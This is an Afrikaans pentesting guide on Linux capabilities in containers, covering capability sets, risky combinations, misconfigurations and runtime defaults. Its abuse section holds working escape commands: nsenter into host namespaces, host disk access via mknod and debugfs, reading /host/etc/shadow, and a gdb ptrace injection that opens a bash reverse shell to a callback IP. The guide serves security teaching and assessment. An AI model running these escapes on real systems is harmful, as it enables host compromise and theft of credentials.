# Linux-capabilities in houers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux-capabilities is een van die belangrikste dele van houersekuriteit, omdat hulle ’n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" werklik binne ’n houer?** Op ’n gewone Linux-stelsel het UID 0 histories ’n baie breë stel voorregte beteken. In moderne kernels word daardie voorregte opgebreek in kleiner eenhede wat capabilities genoem word. ’n Proses kan as root loop en steeds baie kragtige bewerkings nie kan uitvoer nie as die relevante capabilities verwyder is. <sup>[[1]](#references)</sup>

Houers maak sterk staat op hierdie onderskeid. Baie werkladings word steeds vir verenigbaarheid of eenvoud as UID 0 binne die houer geloods. Sonder dat capabilities verwyder word, sou dit veels te gevaarlik wees. Wanneer capabilities verwyder word, kan ’n gerootte proses in ’n houer steeds baie gewone take binne die houer uitvoer, terwyl dit sensitiewer kernel-bewerkings nie kan uitvoer nie. Daarom beteken ’n houershell wat `uid=0(root)` wys nie outomaties "host root" of selfs "breë kernel-voorregte" nie. Die capability-stelle bepaal hoeveel daardie root-identiteit werklik werd is.

Raadpleeg die volgende vir die volledige Linux-capability-verwysing en baie voorbeelde van misbruik:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Werking

Capabilities word in verskeie stelle nagespoor, insluitend permitted-, effective-, inheritable-, ambient- en bounding-stelle. Vir baie houerassesserings is die presiese kernel-semantiek van elke stel minder onmiddellik belangrik as die uiteindelike praktiese vraag: **watter bevoorregte bewerkings kan hierdie proses nou suksesvol uitvoer, en watter toekomstige voorregverhogings is nog moontlik?** <sup>[[1]](#references)</sup>

Dit is belangrik omdat baie uitbraaktegnieke eintlik capability-probleme is wat as houerprobleme vermom is. ’n Werklading met `CAP_SYS_ADMIN` kan toegang kry tot ’n groot hoeveelheid kernelfunksionaliteit waaraan ’n gewone root-proses in ’n houer nie behoort te raak nie. ’n Werklading met `CAP_NET_ADMIN` word baie gevaarliker as dit ook die host se netwerknaamruimte deel. ’n Werklading met `CAP_SYS_PTRACE` word baie interessanter as dit host-prosesse kan sien deur PID-deling met die host. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde, die capability-stel kan nie in isolasie geëvalueer word nie. Dit moet saam met naamruimtes, seccomp en MAC-beleid beoordeel word.

## Lab

’n Baie direkte manier om capabilities binne ’n houer te ondersoek, is:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Jy kan ook ’n meer beperkende container vergelyk met een waaraan alle capabilities toegevoeg is:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Om die effek van ’n beperkte toevoeging te sien, probeer alles verwyder en net een capability weer byvoeg:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

These klein eksperimente help wys dat ’n runtime nie bloot ’n boolean genaamd "privileged" aan- of afskakel nie. Dit vorm die werklike privilege-oppervlak wat vir die proses beskikbaar is.

## Hoërisiko-capabilities

Capabilities word slegs escape-primitiewe wanneer hul werking ’n **host-beheerde hulpbron** bereik. Die herhalende hoërisiko-kombinasies is:

- **`CAP_SYS_ADMIN`** plus ’n host-PID, bloktoestel of skryfbare kernel-beheerpad. Om by ’n teiken se mount namespace aan te sluit, vereis ook `CAP_SYS_CHROOT`; om ’n blokgebaseerde lêerstelsel te mount, vereis `CAP_SYS_ADMIN` in die aanvanklike user namespace.
- **`CAP_SYS_PTRACE`** plus sigbaarheid van host-PIDs en ’n host-proses waaraan geheg kan word. `CAP_SYS_ADMIN` is nie nodig vir ptrace-inspuiting nie.
- **`CAP_DAC_OVERRIDE` of `CAP_DAC_READ_SEARCH`** plus ’n bereikbare host-lêerstelsel. Hierdie capabilities omseil verskillende DAC-kontroles, maar skep nie ’n host-lêerstelsel-aansig nie.
- **`CAP_SYS_MODULE`** in die aanvanklike user namespace plus ’n aanvaarbare, kernel-versoenbare module. Gewone Linux-containers deel die node-kernel; VM- of userspace-kernel-runtimes verander daardie grens.
- **`CAP_MKNOD`** in die aanvanklike user namespace plus ’n werklike host-toestel wat reeds deur die device cgroup toegelaat word. Die skep van ’n node omseil nie die device cgroup nie.
- **`CAP_SYS_RAWIO`** plus ’n blootgestelde en bruikbare geheue-, I/O-poort-, PCI- of toestelbeheer-koppelvlak.
- **`CAP_SYS_BOOT`** plus die aanvanklike PID namespace vir ’n host-herlaai, of ’n bruikbare en toegelate kexec-pad vir kernvervanging.
- **`CAP_NET_ADMIN`** in die host-netwerknamespace vir direkte beheer oor die node se netwerktoestand. **`CAP_NET_RAW`** kan deel wees van ’n protokolspesifieke escape, maar rou sockets alleen gee nie ’n node-shell nie.

`CAP_SYS_CHROOT` word doelbewus nie as ’n selfstandige escape-capability gelys nie. Dit kan nodig wees vir mount-namespace-`setns()` en kan dit makliker maak om ’n reeds toeganklike host-boom te gebruik, maar `chroot()` alleen stel nie daardie boom bloot nie en verleen ook nie nuwe lêerstelseltoestemmings nie. Net so stel `CAP_BPF` en `CAP_PERFMON` kragtige telemetrie- en kernel-aanvalsoppervlaktes bloot, maar sonder ’n afsonderlike kernel-kwesbaarheid is hul gewone werking nie generiese container-escapes nie.

## Runtime-gebruik

Docker, Podman, containerd-gebaseerde stapels en CRI-O gebruik almal capability-kontroles, maar die verstekinstellings en bestuurskoppelvlakke verskil. Docker stel hulle direk beskikbaar deur vlae soos `--cap-drop` en `--cap-add`. Podman bied soortgelyke kontroles en kombineer dit dikwels met rootless-uitvoering as ’n bykomende veiligheidslaag. Kubernetes stel capability-byvoegings en -verwyderings deur die Pod- of container-`securityContext` beskikbaar; laervlak-runtimes druk die gevolglike stelle in die OCI-runtime-konfigurasie uit. Stelselcontainer-omgewings soos LXC en Incus maak ook staat op capability-beheer, maar hul breër host-integrasie kan operateurs verlei om verstekinstellings meer aggressief te verslap as wat hulle vir ’n toepassingscontainer sou doen. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Dieselfde beginsel geld vir hulle almal: ’n capability wat tegnies toegestaan kan word, is nie noodwendig een wat toegestaan behoort te word nie. Baie werklike voorvalle begin wanneer ’n operateur ’n capability byvoeg bloot omdat ’n workload onder ’n strenger konfigurasie misluk het en die span ’n kitsoplossing nodig gehad het.

## Foutkonfigurasies

Die mees ooglopende fout is **`--cap-add=ALL`** in Docker/Podman-styl CLI’s, maar dit is nie die enigste een nie. In die praktyk is ’n meer algemene probleem dat een of twee uiters kragtige capabilities, veral `CAP_SYS_ADMIN`, toegestaan word om “die toepassing te laat werk” sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. Nog ’n algemene foutmodus is om ekstra capabilities met gedeelde host-namespaces te kombineer. In Docker of Podman kan dit verskyn as `--pid=host`, `--network=host` of `--userns=host`; in Kubernetes verskyn die ekwivalente blootstelling gewoonlik deur workload-instellings soos `hostPID: true` of `hostNetwork: true`. Elkeen van hierdie kombinasies verander wat die capability werklik kan beïnvloed.

Dit gebeur ook dikwels dat administrateurs glo dat ’n workload steeds betekenisvol beperk is omdat dit nie ten volle `--privileged` is nie. Soms is dit waar, maar soms is die effektiewe sekuriteitsposisie reeds na genoeg aan privileged dat die onderskeid operasioneel nie meer saak maak nie.

## Misbruik

Begin deur die effektiewe stelle, user-namespace-kartering, seccomp-toestand, namespaces, mounts en toestelle aan te teken. ’n Capability-naam sonder hierdie konteks bewys nie ’n escape nie:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces en bloktoestelle

Met sigbaarheid van die host-PID kan `CAP_SYS_ADMIN` host-namespaces betree. Die mount-namespace-bewerking vereis ook `CAP_SYS_CHROOT` in die gebruiker se namespace.

**Kontroleer die capability en beperking:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Enumerate die teiken:** bevestig die deling van host PID vanaf die container/Pod-konfigurasie of ’n onmiskenbare host-proseslys, en inspekteer dan die teiken se namespaces. ’n Plaaslike PID 1 bestaan ook in private PID-namespaces, dus bewys die blote teenwoordigheid daarvan nie die deling van host PID nie.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Exploit die naamruimtepad:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Die capability-kontroles moet slaag in die user namespaces wat die teikens besit. `--pid=host` of Kubernetes `hostPID: true` verskaf sigbaarheid; dit verskaf nie die capabilities nie.

Vir die alternatiewe bloktoestelroete moet jy die kandidate **enumerate** en dan die toeganklike lêerstelsel **exploit** deur eers die gevalideerde kandidaat as slegs-lees te mount:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Die toestelnode moet bestaan, die device cgroup moet dit toelaat, en block-filesystem-mounts vereis `CAP_SYS_ADMIN` in die aanvanklike user namespace. ’n Host root wat reeds by `/host` bind-mounted is, bied host-toegang **sonder** `CAP_SYS_ADMIN`; `chroot /host` is net geriefliker en vereis afsonderlik `CAP_SYS_CHROOT`.

### Bereikbare host root: direkte lêerstelseluitvoering

As die host root reeds by `/host` gemount is, bevestig eers die mount en gebruik dan die bestaande toegang direk. Hierdie metode is nie afhanklik van `CAP_SYS_ADMIN` nie:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

As `chroot()` nie beskikbaar is nie, maar die gasheer se binêre lêer versoenbaar is met die houer se argitektuur en laaier, kan dit dikwels via die gemonteerde boom aangeroep word:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Direkte lees- en skryfbewerkings onder `/host` beteken reeds dat die gasheerlêerstelsel gekompromitteer is. `chroot()` of die uitvoer van ’n gasheerbinary maak daardie toegang net geriefliker; geen van die bewerkings skep die gasheermount of omseil ’n leesalleenmount of MAC-beleid nie.

### `CAP_SYS_PTRACE`: inspuiting in gasheerprosesse

Met sigbaarheid van gasheer-PID’s en `CAP_SYS_PTRACE` in die teiken se gebruikersnaamruimte kan GDB ’n goedgekeurde gasheerproses `system()` laat aanroep. `CAP_SYS_ADMIN` word nie vereis nie.

**Kontroleer die capability en aanhegkontroles:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Enumereer en kies ’n weggooibare teiken:** bevestig host-PID-deling vanaf die konfigurasie of ’n onmiskenbare node-proseslys; kies nooit PID 1 of ’n kritieke daemon nie.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit die geselekteerde proses:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Die teiken moet aangeheg kan word en ’n bruikbare `system()`-simbool en Bash-payloadpad hê. Yama, ’n nie-dumpbare toestand, seccomp, user namespaces en MAC-beleid kan die ketting blokkeer. GDB stop die teiken terwyl dit aangeheg is, gebruik dus slegs ’n weggooibare lab-proses.

### `CAP_DAC_OVERRIDE` en `CAP_DAC_READ_SEARCH`: beskermde gasheerlêers

Hierdie capabilities stel nie die gasheerlêerstelsel bloot nie. As `/host` reeds ’n gasheermount is, kan `CAP_DAC_READ_SEARCH` DAC-lees-/soekkontroles omseil, en `CAP_DAC_OVERRIDE` kan ook gewone skryfkonto les omseil:

**Kontroleer die capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Inventariseer die blootgestelde gasheerlêerstelsel en teikentoestemmings:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Oefen die lees- en skryfomseilings** in ’n weggooibare lab:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

'n Leesalleen-mount en LSM-reëls geld steeds. `CAP_DAC_READ_SEARCH` magtig ook `open_by_handle_at()`, maar 'n breakout soos Shocker vereis boonop 'n mount-lêerbeskrywer vir dieselfde onderliggende lêerstelsel, geldige of ontdekbare handles, 'n versoenbare lêerstelsel-/bergingsuitleg, en geen blokkering deur die runtime of LSM nie. Dit bied nie arbitrêre toegang tot elke lêerstelsel buite die mount-namespace nie.

### `CAP_SYS_MODULE`: uitvoering in die gedeelde kernel

In 'n gewone Linux-container loop 'n module wat aanvaar word in die gedeelde host-kernel.

**Kontroleer die capability en user-namespace-omvang:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Lys die voorvereistes vir die laai van modules:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit slegs met ’n versoenbare, vooraf nagegane proof module op ’n weggooibare node:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Die capability moet effektief wees in die aanvanklike user namespace. Die kernweergawe en -konfigurasie, modulehandtekeninge, lockdown, seccomp en LSM-beleid moet die laai toelaat. Kata, gVisor, Hyper-V-isolasie en soortgelyke runtimes verander watter kerngrens die workload bereik.

### `CAP_MKNOD`: skep ’n toegelate toestelhanteerder

`CAP_MKNOD` skep ’n toestelnodus, maar omseil nie die device cgroup nie. Toestelskepping is nie namespaced nie, dus moet die capability effektief wees in die aanvanklike user namespace.

**Kontroleer die capability en user-namespace-omvang:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Lys die werklike toestelle, hul major-/minor-nommers en enige sigbare cgroup-v1-toelaatlys:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit ’n gevalideerde ext-family-kandidaat in leesalleenmodus:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Ander lêerstelsels benodig ’n ooreenstemmende leesalleen-nutsding; om die toestel te mount, vereis ook `CAP_SYS_ADMIN`. `Operation not permitted` wanneer die geskepte nodus oopgemaak word, dui gewoonlik daarop dat die device cgroup dit steeds blokkeer. Onder cgroup v2 word toest toegang algemeen met BPF afgedwing, en daar is geen `devices.list`-lêer nie, dus is ’n suksesvolle open die beslissende toets.

### `CAP_SYS_RAWIO`: blootgestelde raw-I/O-koppelvlak

Daar is geen draagbare generiese payload nie: geldige adresse en uitwerkings hang af van die hardeware en kernkonfigurasie.

**Kontroleer die capability en user-namespace-omvang:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Lys blootgestelde rou koppelvlakke, hardeware en drywers:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Voer die exploit slegs uit met ’n goedgekeurde bewys vir die geïdentifiseerde toestel en adresreeks.** As `/dev/mem` die laboratoriumgoedgekeurde koppelvlak is, bewys hierdie sjabloon dat node-geheue blootgelê kan word sonder om die inhoud daarvan te druk:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Die adres moet van die laboratorium se hardewarekaart kom, omdat die lees van sommige MMIO-streke newe-effekte kan hê. ’n Generiese geheueskryf-opdrag sou misleidend en onveilig wees: dieselfde adres kan op een masjien onskadelik wees en op ’n ander hardeware of kerngeheue beheer. Toestel-cgroups, lêerstelseltoestemmings, streng `/dev/mem`-beheer, kernvergrendeling, virtualisering en LSM-beleid verhoed gewoonlik nuttige toegang.

### `CAP_SYS_BOOT`: herlaai van ’n namespace of vervanging van die kern

In ’n private PID-namespace beëindig `reboot()` daardie namespace se init-proses eerder as om die gasheer te herlaai. Om die gasheer te herlaai vereis dus die aanvanklike PID-namespace, gewoonlik deur PID-deling met die gasheer. ’n kexec-pad vereis ook ’n versoenbare kernbeeld en ’n permissiewe vergrendelings-/handtekeningbeleid:

**Kontroleer die capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Lys die PID-naamruimte- en kexec-voorvereistes:** bevestig PID-deling met die gasheer aan die hand van die workload-konfigurasie, want ’n PID-naamruimteskakel alleen onthul nie of dit die node se aanvanklike naamruimte is nie.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit slegs wanneer die herlaai van ’n weggooibare labnode die uitdruklike oefening is:**

```bash
sync
reboot -f
```

Moenie daardie opdrag uitvoer of ’n kernel op ’n gedeelde node laai bloot om die capability te bewys nie. In ’n private PID namespace beëindig dit slegs daardie namespace se init-proses en demonstreer dit nie impak op die host nie.

### `CAP_NET_ADMIN` en `CAP_NET_RAW`: netwerkpaaie na die host

`CAP_NET_ADMIN` beïnvloed slegs die huidige network namespace.

**Kontroleer die capabilities en beperkings:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumereer die huidige netwerk en bevestig gasheernetwerkgebruik vanuit die werklas-konfigurasie:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Gebruik `CAP_NET_ADMIN` omkeerbaar:** met gasheernetwerk is die tydelike koppelvlak ’n noduskoppelvlak.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` laat RAW- en PACKET-sokke toe, maar bied nie ’n generiese shell op die gasheer nie. Om die gedokumenteerde GCE-ketting te **enumerate**, kontroleer die metadata-roete en bepaal of plaintext-verkeer van die guest agent waarneembaar is:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

As die ooreenstemmende voorvereistes bestaan, **exploit** die omgewingspesifieke ketting soos gedokumenteer in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): vang die versoek en volgordetoestand vas, spuit die vervalste metadatarespons met ’n SSH-sleutel in, en bevestig dan toegang tot die host. Die ketting het root, host-netwerk, `CAP_NET_ADMIN`, `CAP_NET_RAW`, GCE-metadata-verkeer in helder teks en ’n guest-agent-versoek met ’n uitbuitbare wedlooptoestand vereis; moderne vervoer of agentgedrag kan dit laat misluk.

### Beperkings op plaaslike oorsprong en koppelvlakadresse

’n Listener kan verbindings waarvan die bron `127.0.0.1` is, verwerp, maar ’n ander adres wat aan dieselfde netwerknaamruimte toegeken is, miskyk. As die listener vanaf daardie koppelvlak bereikbaar is, vergelyk ’n loopback-verbinding met een wat aan ’n bestaande nie-loopback-plaaslike adres gebind is. `CAP_NET_ADMIN` kan konfigurasie van koppelvlakke in die huidige naamruimte moontlik maak, maar is nie nodig as ’n geskikte adres reeds toegeken is nie. `CAP_NET_RAW` is nie ’n voorvereiste vir ’n gewone TCP-verbinding nie. Dit is ’n fout in bronadresklassifikasie, nie ’n container escape of bewys dat die toepassing ’n bevoorregte versoek sal magtig nie.<sup>[[1]](#references)[[7]](#references)</sup>

Vir ’n WebSocket-listener bevestig ’n geldige HTTP-antwoord `101 Switching Protocols` dat die aanvanklike handdruk voltooi is; ’n daaropvolgende toepassingsvlakfout kan wys dat die verbinding die hanteerder bereik het. Geen van die antwoorde bewys dat verifikasie of die aangevraagde bewerking geslaag het nie.<sup>[[8]](#references)</sup>

## Kontroles

Die doel van die capability-kontroles is nie net om rou waardes uit te voer nie, maar ook om te verstaan of die proses genoeg voorregte het om sy huidige naamruimte- en mountsituasie gevaarlik te maak.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Wat hier interessant is:

- `capsh --print` is die maklikste manier om hoërisiko-capabilities soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` of `cap_sys_module raak te sien.
- Die `CapEff`-reël in `/proc/self/status` wys wat nou werklik effektief is, nie net wat dalk in ander stelle beskikbaar is nie.
- ’n Capability-dump is baie belangriker as die container ook die gasheer se PID-, netwerk- of user namespaces deel, of skryfbare gasheermounts het.

Nadat die rou capability-inligting versamel is, is die volgende stap interpretasie. Vra of die proses root is, of user namespaces aktief is, of gasheernamespaces gedeel word, of seccomp afdwingend is, en of AppArmor of SELinux die proses steeds beperk. ’n Capability-stel op sy eie is slegs deel van die verhaal, maar dit verklaar dikwels waarom een container breakout werk en ’n ander met dieselfde oënskynlike beginpunt misluk.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Verminderde capability-stel by verstek | Docker hou by verstek ’n toelaatlys van capabilities en laat die res weg | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde capability-stel by verstek | Podman-containers is by verstek onbevoorreg en gebruik ’n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-verstekwaardes tensy dit verander word | As geen `securityContext.capabilities` gespesifiseer word nie, kry die container die runtime se verstek-capability-stel | `securityContext.capabilities.add`, versuim om `drop: [\"ALL\"]` te gebruik, `privileged: true` |
| containerd / CRI-O onder Kubernetes | Gewoonlik runtime-verstekwaarde | Die effektiewe stel hang af van die runtime plus die Pod-spesifikasie | dieselfde as die Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities uitdruklik byvoeg |

Vir Kubernetes is die belangrike punt dat die API nie een universele verstek-capability-stel definieer nie. As die Pod nie capabilities byvoeg of weglaat nie, erf die werklas die runtime-verstekwaarde vir daardie node.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux-containerkonfigurasie](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker-dokumentasie - Runtime-voorregte en Linux-capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes-dokumentasie - Stel capabilities vir ’n container in](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman-dokumentasie - `--cap-add` en `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus-dokumentasie - Sekuriteit](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4-protokolimplementering](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Die WebSocket-protokol](https://www.rfc-editor.org/rfc/rfc6455.html)
